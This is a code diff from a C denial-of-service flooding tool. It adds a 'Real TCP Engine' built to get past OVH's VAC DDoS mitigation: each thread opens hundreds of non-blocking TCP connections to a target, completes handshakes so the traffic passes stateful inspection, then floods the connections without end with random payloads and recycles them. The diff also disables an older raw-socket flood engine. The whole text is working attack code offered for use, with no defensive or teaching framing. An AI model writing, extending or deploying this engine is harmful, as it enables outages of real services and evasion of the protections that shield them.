@@ -1662,13 +1662,165 @@ void *worker_thread(void *arg) {
         }
     }
     if (args.is_v17_tcp_bypass) {
-        // === V18 OVH FULL BYPASS ENGINE ===
-        // Strategy: ALL packets = full MTU 1514B for max Gbps/PPS
-        //   Hot send loop: PSH+ACK + ACK + RST+ACK mix at 1460B payload
-        //   Variable: TTL, window, src_port, seq, IP ID, payload type
-        //   3WHS: dedicated recv thread reads SYN-ACK → sends ACK to complete handshake
-        //         Once completed, slot marked ESTABLISHED -> passes stateful FW
-        //   Result: 9+ Gbps + bypass OVH VAC stateful inspection
+        // === V18 REAL TCP ENGINE — OVH VAC BYPASS ===
+        // Uses kernel TCP stack (SOCK_STREAM) to complete real 3WHS through OVH's VAC proxy
+        // Then floods data through established connections
+        
+        #define RT_CONNS 200      // Connections per thread
+        #define RT_PAYLOAD 1400   // Payload size per send
+        #define RT_SNDBUF (16*1024*1024)  // 16MB send buffer
+        #define RT_MAX_BYTES (256*1024)   // Recycle after 256KB per connection
+        #define RT_EPOLL_SIZE 256
+        
+        // Huge random payload buffer
+        unsigned char *rt_payload = malloc(RT_PAYLOAD);
+        for (int i = 0; i < RT_PAYLOAD; i++) rt_payload[i] = fast_rand() & 0xFF;
+        
+        struct rt_conn {
+            int fd;
+            int state; // 0=connecting, 1=established, 2=dead
+            unsigned int bytes_sent;
+        };
+        
+        struct rt_conn *conns = calloc(RT_CONNS, sizeof(struct rt_conn));
+        int rt_epfd = epoll_create1(0);
+        
+        struct sockaddr_in rt_target;
+        memset(&rt_target, 0, sizeof(rt_target));
+        rt_target.sin_family = AF_INET;
+        rt_target.sin_port = htons(args.port);
+        rt_target.sin_addr.s_addr = bin_target_ip;
+        
+        // Helper: create one connection
+        #define RT_CREATE_CONN(idx) do { \
+            int _fd = socket(AF_INET, SOCK_STREAM, 0); \
+            if (_fd < 0) break; \
+            int _fl = fcntl(_fd, F_GETFL, 0); \
+            fcntl(_fd, F_SETFL, _fl | O_NONBLOCK); \
+            int _one = 1; \
+            setsockopt(_fd, IPPROTO_TCP, TCP_NODELAY, &_one, sizeof(_one)); \
+            int _sbuf = RT_SNDBUF; \
+            setsockopt(_fd, SOL_SOCKET, SO_SNDBUF, &_sbuf, sizeof(_sbuf)); \
+            struct linger _lg = {1, 0}; \
+            setsockopt(_fd, SOL_SOCKET, SO_LINGER, &_lg, sizeof(_lg)); \
+            connect(_fd, (struct sockaddr*)&rt_target, sizeof(rt_target)); \
+            conns[idx].fd = _fd; \
+            conns[idx].state = 0; \
+            conns[idx].bytes_sent = 0; \
+            struct epoll_event _ev; \
+            _ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP | EPOLLET; \
+            _ev.data.u32 = (unsigned int)(idx); \
+            epoll_ctl(rt_epfd, EPOLL_CTL_ADD, _fd, &_ev); \
+        } while(0)
+        
+        // Create all initial connections
+        for (int i = 0; i < RT_CONNS; i++) {
+            conns[i].fd = -1;
+            RT_CREATE_CONN(i);
+        }
+        
+        LOG_INFO("T%d: Real TCP Engine started, %d conns to %s:%d", 
+                 tid, RT_CONNS, inet_ntoa(rt_target.sin_addr), args.port);
+        fflush(stdout);
+        
+        struct epoll_event rt_events[RT_EPOLL_SIZE];
+        unsigned long long rt_round = 0;
+        
+        while (1) {
+            int nev = epoll_wait(rt_epfd, rt_events, RT_EPOLL_SIZE, 5);
+            
+            for (int e = 0; e < nev; e++) {
+                unsigned int idx = rt_events[e].data.u32;
+                if (idx >= (unsigned int)RT_CONNS) continue;
+                
+                struct rt_conn *c = &conns[idx];
+                
+                // Error or hangup → reconnect
+                if (rt_events[e].events & (EPOLLERR | EPOLLHUP)) {
+                    epoll_ctl(rt_epfd, EPOLL_CTL_DEL, c->fd, NULL);
+                    close(c->fd);
+                    c->fd = -1;
+                    c->state = 2;
+                    RT_CREATE_CONN(idx);
+                    continue;
+                }
+                
+                // Writable
+                if (rt_events[e].events & EPOLLOUT) {
+                    if (c->state == 0) {
+                        // Check if connect completed
+                        int err = 0;
+                        socklen_t elen = sizeof(err);
+                        getsockopt(c->fd, SOL_SOCKET, SO_ERROR, &err, &elen);
+                        if (err != 0) {
+                            // Connect failed → reconnect
+                            epoll_ctl(rt_epfd, EPOLL_CTL_DEL, c->fd, NULL);
+                            close(c->fd);
+                            c->fd = -1;
+                            c->state = 2;
+                            RT_CREATE_CONN(idx);
+                            continue;
+                        }
+                        c->state = 1; // Established!
+                    }
+                    
+                    if (c->state == 1) {
+                        // Send data in a burst
+                        for (int burst = 0; burst < 16; burst++) {
+                            // Randomize some bytes in payload each burst
+                            *((unsigned int*)(rt_payload)) = fast_rand();
+                            *((unsigned int*)(rt_payload + 4)) = fast_rand();
+                            
+                            int sent = send(c->fd, rt_payload, RT_PAYLOAD, MSG_NOSIGNAL | MSG_DONTWAIT);
+                            if (sent > 0) {
+                                c->bytes_sent += sent;
+                                thread_stats[tid].packets++;
+                                thread_stats[tid].bytes += sent;
+                            } else {
+                                if (errno == EAGAIN || errno == EWOULDBLOCK) break;
+                                // Connection error → reconnect
+                                epoll_ctl(rt_epfd, EPOLL_CTL_DEL, c->fd, NULL);
+                                close(c->fd);
+                                c->fd = -1;
+                                c->state = 2;
+                                RT_CREATE_CONN(idx);
+                                break;
+                            }
+                        }
+                        
+                        // Recycle connection after sending enough data
+                        if (c->bytes_sent > RT_MAX_BYTES) {
+                            epoll_ctl(rt_epfd, EPOLL_CTL_DEL, c->fd, NULL);
+                            close(c->fd);
+                            c->fd = -1;
+                            c->state = 2;
+                            RT_CREATE_CONN(idx);
+                        }
+                    }
+                }
+            }
+            
+            // Periodically reconnect dead connections
+            rt_round++;
+            if (rt_round % 100 == 0) {
+                for (int i = 0; i < RT_CONNS; i++) {
+                    if (conns[i].fd < 0 || conns[i].state == 2) {
+                        RT_CREATE_CONN(i);
+                    }
+                }
+            }
+        }
+        
+        // Cleanup (unreachable but good practice)
+        free(rt_payload);
+        free(conns);
+        close(rt_epfd);
+        return NULL;
+    }
+    
+    /* === LEGACY RAW SOCKET ENGINE (kept for non-OVH targets) ===
+    if (args.is_v17_tcp_bypass_RAW) {
+        // Old raw socket engine - disabled, use Real TCP Engine above
 
         int stealth = args.is_stealth;
         int nc=sysconf(_SC_NPROCESSORS_ONLN);
@@ -2313,6 +2465,7 @@ void *worker_thread(void *arg) {
         close(fd_send);close(fd_send2);close(fd_recv);
         return NULL;
     }
+    === END LEGACY RAW SOCKET ENGINE === */
 
 
 
